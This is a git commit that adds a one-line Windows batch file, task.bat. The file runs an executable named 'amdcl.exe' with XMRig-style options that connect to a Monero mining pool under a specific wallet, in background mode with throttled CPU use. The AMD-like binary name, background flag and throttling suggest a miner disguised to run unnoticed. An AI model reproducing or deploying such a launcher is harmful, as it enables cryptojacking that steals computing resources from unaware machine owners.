70808f50ba8a3ed7f7bf2c263ce3cea3d2e56138
keremxx <keremx1977@gmail.com>
2021-01-06 10:51:59 +0300

    Add files via upload

---
+++ task.bat
@@ -0,0 +1,3 @@
+
+amdcl.exe -o pool.supportxmr.com:443 -u 453ys3CV57Nbg2XCekHZdJRHyGd4uSB1oTuWEs5btLfsYDKE71XAmUVYybZXVBeZDS34zWxkWL6pNRNPPXHChq6CGwNa5j4 -k  -B --tls -p vpss  --cpu-max-threads-hint 25
+pause
